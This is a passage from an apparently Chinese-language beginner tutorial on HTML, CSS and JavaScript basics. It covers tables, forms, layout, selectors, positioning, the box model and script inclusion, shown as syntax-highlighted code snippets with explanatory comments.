class="name">li</span>&gt;</span>ol2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>ul1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>ul2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/%E5%89%8D%E7%AB%AF3%E5%89%91%E5%AE%A2.assets/html4.png"></p><h3 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">a</span></span><br><span class="line"><span class="comment">href 目标的地址</span></span><br><span class="line"><span class="comment">target 打开方式</span></span><br><span class="line"><span class="comment">_self 当前页面</span></span><br><span class="line"><span class="comment">_blank 新页面</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>baidu<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">img</span></span><br><span class="line"><span class="comment">src  图片路径</span></span><br><span class="line"><span class="comment">title 鼠标悬停时提示的文字</span></span><br><span class="line"><span class="comment">alt 加载失败时提示的文字</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">table 整张表格 boder 加线条</span></span><br><span class="line"><span class="comment">thead 表头</span></span><br><span class="line"><span class="comment">tbody 表体</span></span><br><span class="line"><span class="comment">tfoot 表尾</span></span><br><span class="line"><span class="comment">tr 表格中的一行</span></span><br><span class="line"><span class="comment">td 行中的一个单元格 rowspan 让单元格跨行 colspan 让单元格跨列</span></span><br><span class="line"><span class="comment">th 自带加粗居中效果的td</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span>员工技能竞赛评分表<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">style</span>=<span class="string">&quot;margin: 0px auto;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>排名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>分数<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>备注<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>小明<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>100<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;4&quot;</span>&gt;</span>前3名加薪<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>小白<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>99<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>小黑<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>98<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>总人数<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>200<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tfoot</span>&gt;</span></span><br><span class="line">           </span><br><span class="line">        <span class="tag">&lt;/<span class="name">tfoot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/%E5%89%8D%E7%AB%AF3%E5%89%91%E5%AE%A2.assets/html5.png"></p><h3 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">form</span></span><br><span class="line"><span class="comment">action 数据提交地址</span></span><br><span class="line"><span class="comment">method 提交方式 get/post </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">input</span></span><br><span class="line"><span class="comment">type 输入信息类型</span></span><br><span class="line"><span class="comment">text 普通文本框</span></span><br><span class="line"><span class="comment">passowrd 密码框 </span></span><br><span class="line"><span class="comment">定义name属性</span></span><br><span class="line"><span class="comment">submit 提交按钮</span></span><br><span class="line"><span class="comment">reset 重置按钮</span></span><br><span class="line"><span class="comment">定义value属性</span></span><br><span class="line"><span class="comment">radio 单选框 多个单选框使用相同name属性，则会有互斥效果</span></span><br><span class="line"><span class="comment">设置value属性提交</span></span><br><span class="line"><span class="comment">设置checked属性默认值</span></span><br><span class="line"><span class="comment">checkbox 复选框</span></span><br><span class="line"><span class="comment">hidde   隐藏域 页面不会显示 可提交</span></span><br><span class="line"><span class="comment">readonly 页面显示但不能修改 可提交</span></span><br><span class="line"><span class="comment">disabled 页面显示但不能修改 不可提交</span></span><br><span class="line"><span class="comment">textarea 文本域</span></span><br><span class="line"><span class="comment">select 下拉框</span></span><br><span class="line"><span class="comment">option 选项</span></span><br><span class="line"><span class="comment">selected 默认值</span></span><br><span class="line"><span class="comment">file 文件上传框</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;01firstpage.html&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pid&quot;</span> <span class="attr">value</span>=<span class="string">&quot;4556&quot;</span> <span class="attr">readonly</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;tid&quot;</span> <span class="attr">value</span>=<span class="string">&quot;789&quot;</span> <span class="attr">disabled</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        密码：  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    性别：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">checked</span>=<span class="string">&quot;true&quot;</span>&gt;</span>男</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>女</span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    爱好：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span>蓝球</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span>足球</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span>乒乓球<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    个人简介：<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;intro&quot;</span> <span class="attr">id</span>=<span class="string">&quot;2&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    籍贯：</span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;pro&quot;</span> <span class="attr">id</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>广西<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>广东<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> <span class="attr">selected</span>&gt;</span>请选择<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登陆&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;清空&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/%E5%89%8D%E7%AB%AF3%E5%89%91%E5%AE%A2.assets/html6.png"></p><h3 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">div 相当与盒子 块元素 css样式的宽 高等 往往都是生效的</span></span><br><span class="line"><span class="comment">span 行内元素 css样式的宽 高等 往往都是不生效的</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;border: 1px solid red; width: 500px;height: 200px; margin: 10px auto;&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;border: 1px solid red; width: 500px;height: 200px; margin: 10px auto;&quot;</span>&gt;</span>456<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;border: 1px solid red; width: 500px;height: 200px; margin: 10px auto;&quot;</span>&gt;</span>789<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;border: 1px solid red; width: 500px;height: 200px; margin: 10px auto;&quot;</span>&gt;</span>555<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/%E5%89%8D%E7%AB%AF3%E5%89%91%E5%AE%A2.assets/html7.png"></p><h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><h3 id="引入方式"><a href="#引入方式" class="headerlink" title="引入方式"></a>引入方式</h3><p>​                            </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">方式<span class="number">1</span> 行内式</span><br><span class="line">通过元素的的style属性引入式</span><br><span class="line">语法：style=&quot;样式名：样式值;样式名:样式值......<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--&gt;</span></span><br><span class="line"><span class="string">&lt;button style=&quot;</span>width: <span class="number">60px</span>;<span class="attribute">height</span>: <span class="number">40px</span>; <span class="attribute">background-color</span>: aqua; <span class="attribute">color</span>: white;<span class="attribute">border-radius</span>: <span class="number">5px</span>;&quot; </span><br><span class="line">class=&quot;butt&quot; id=&quot;<span class="number">2</span>&quot;</span><br><span class="line">&gt;按钮&lt;/<span class="selector-tag">button</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">方式<span class="number">2</span> 内嵌式</span><br><span class="line">通过head标签中的style定义本页面的公共样式</span><br><span class="line"></span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">button</span>&#123;</span><br><span class="line">            <span class="attribute">width</span>: <span class="number">60px</span>;<span class="attribute">height</span>: <span class="number">40px</span>; <span class="attribute">background-color</span>: aqua; <span class="attribute">color</span>: white;<span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">方式<span class="number">3</span> 外部样式表</span><br><span class="line">将css代码单独放入<span class="selector-class">.css</span>文件中，<span class="selector-tag">html</span>在head中通过link标签引入</span><br><span class="line">--&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;btn<span class="selector-class">.css</span>&quot;&gt;</span><br></pre></td></tr></table></figure><p>​                     </p><h3 id="css选择器"><a href="#css选择器" class="headerlink" title="css选择器"></a>css选择器</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 元素选择器 --&gt;</span><br><span class="line"><span class="selector-tag">button</span>&#123;</span><br><span class="line">            <span class="attribute">width</span>: <span class="number">60px</span>;<span class="attribute">height</span>: <span class="number">40px</span>; <span class="attribute">background-color</span>: aqua; <span class="attribute">color</span>: white;<span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- id选择器 --&gt;</span><br><span class="line"><span class="selector-id">#2</span>&#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">60px</span>;<span class="attribute">height</span>: <span class="number">40px</span>; <span class="attribute">background-color</span>: aqua; <span class="attribute">color</span>: white;<span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- class选择器 一个元素可以有多个class--&gt;</span><br><span class="line"><span class="selector-class">.bott</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">60px</span>;<span class="attribute">height</span>: <span class="number">40px</span>; <span class="attribute">background-color</span>: aqua; <span class="attribute">color</span>: white;<span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="css浮动"><a href="#css浮动" class="headerlink" title="css浮动"></a>css浮动</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="attribute">float</span> 使多个<span class="selector-tag">div</span>在同一行</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="selector-tag">div</span> style=&quot;<span class="attribute">background-color</span>: brown;<span class="attribute">height</span>: <span class="number">100px</span>;&quot;&gt;</span><br><span class="line">        &lt;<span class="selector-tag">div</span> style=&quot;<span class="attribute">background-color</span>: antiquewhite;<span class="attribute">float</span>: right;&quot;&gt;<span class="number">123</span>&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">        &lt;<span class="selector-tag">div</span> style=&quot; <span class="attribute">background-color</span>: beige;<span class="attribute">float</span>: right;&quot;&gt;<span class="number">456</span>&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">        &lt;<span class="selector-tag">div</span> style=&quot;<span class="attribute">background-color</span>: blue;<span class="attribute">float</span>: right;&quot;&gt;<span class="number">789</span>&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line"> &lt;/<span class="selector-tag">div</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/%E5%89%8D%E7%AB%AF3%E5%89%91%E5%AE%A2.assets/css1.png"></p><h3 id="css定位"><a href="#css定位" class="headerlink" title="css定位"></a>css定位</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="attribute">position</span></span><br><span class="line">static 默认</span><br><span class="line">relative 相对 对于元素原来位置</span><br><span class="line">fixed 相对 固定在浏览器页面（页面滑动还是在页面原来位置）</span><br><span class="line">absolute 绝对 对于浏览器</span><br><span class="line"><span class="attribute">left</span></span><br><span class="line"><span class="attribute">right</span></span><br><span class="line"><span class="attribute">top</span></span><br><span class="line"><span class="attribute">bottom</span></span><br><span class="line">--&gt;</span><br><span class="line">&lt;<span class="selector-tag">div</span> style=&quot;<span class="attribute">height</span>: <span class="number">100px</span>;&quot;&gt;</span><br><span class="line">        &lt;<span class="selector-tag">div</span> style=&quot;<span class="attribute">background-color</span>: antiquewhite; <span class="attribute">position</span>: fixed;<span class="attribute">bottom</span>: <span class="number">75px</span>;&quot;&gt;<span class="number">123</span>&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">        &lt;<span class="selector-tag">div</span> style=&quot; <span class="attribute">background-color</span>: beige;&quot;&gt;<span class="number">456</span>&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">        &lt;<span class="selector-tag">div</span> style=&quot;<span class="attribute">background-color</span>: blue;<span class="attribute">position</span>: relative;<span class="attribute">left</span>:  <span class="number">75px</span>;&quot;&gt;<span class="number">789</span>&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">    &lt;/<span class="selector-tag">div</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/%E5%89%8D%E7%AB%AF3%E5%89%91%E5%AE%A2.assets/css2.png"></p><h3 id="css盒子模型"><a href="#css盒子模型" class="headerlink" title="css盒子模型"></a>css盒子模型</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="attribute">Margin</span>(外边距) - 清除边框外的区域，外边距是透明的。</span><br><span class="line"><span class="attribute">Border</span>(边框) - 围绕在内边距和内容外的边框。</span><br><span class="line"><span class="attribute">Padding</span>(内边距) - 清除内容周围的区域，内边距是透明的。</span><br><span class="line"><span class="attribute">Content</span>(内容) - 盒子的内容，显示文本和图像。</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">25px</span> solid green;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">25px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><h3 id="引入方式-1"><a href="#引入方式-1" class="headerlink" title="引入方式"></a>引入方式</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="number">1.</span>内嵌式</span><br><span class="line">在head中通过script标签定义脚本代码</span><br><span class="line">--&gt; </span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">function</span> <span class="title function_">suprise</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="title function_">alert</span>(<span class="string">&quot;惊喜&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;suprise()&quot;</span>&gt;</span>点我有惊喜<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line"><span class="number">2.</span>引入外部脚本文件 </span><br><span class="line">在head中通过script引入外部js文件</span><br><span class="line">--&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/button.js&quot;</span> <span class="attr">type</span>=<span 